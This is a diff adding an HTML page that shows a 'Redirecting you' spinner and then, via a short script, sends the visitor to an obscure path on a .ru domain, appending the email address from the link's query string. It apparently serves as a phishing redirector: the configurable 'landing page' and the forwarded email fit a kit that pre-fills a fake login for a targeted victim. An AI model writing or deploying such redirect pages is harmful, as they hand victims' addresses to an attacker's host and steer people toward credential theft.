@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Redirecting...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    .banner {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      background: #0d0d0d;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 12px 20px;
+      font-family: sans-serif;
+      font-size: 13px;
+      z-index: 9999;
+      border-bottom: 1px solid rgba(255,255,255,0.08);
+    }
+
+    .spinner {
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.2);
+      border-top-color: #6de3b4;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .progress {
+      position: fixed;
+      top: 41px; left: 0;
+      height: 2px;
+      background: #6de3b4;
+      width: 0%;
+      animation: fill 1s linear forwards;
+    }
+
+    @keyframes fill { to { width: 100%; } }
+
+    .banner span { color: #aaa; }
+    .banner strong { color: #fff; font-weight: 600; }
+  </style>
+</head>
+<body>
+
+  <div class="banner">
+    <div class="spinner"></div>
+    <div><strong>Redirecting you</strong> <span>— please wait...</span></div>
+  </div>
+  <div class="progress"></div>
+
+  <script>
+    // ── CONFIG ─────────────────────────────────────────
+    const LANDING_PAGE = "https://peabaite.ru/QQmqtl!qi3a5ECM6jV3PMkS/"; // ← your landing page
+    const DELAY_MS     = 1000;                        // ← 1 second delay
+    // ───────────────────────────────────────────────────
+
+    // Get email from URL parameter
+    const params = new URLSearchParams(window.location.search);
+    const email  = params.get("email") || "";
+
+    setTimeout(() => {
+      if (email) {
+        // Build clean URL manually — no trailing slash, no double encoding
+        window.location.href = LANDING_PAGE + "?email=$" + encodeURIComponent(email);
+      } else {
+        window.location.href = LANDING_PAGE;
+      }
+    }, DELAY_MS);
+  </script>
+
+</body>
+</html>
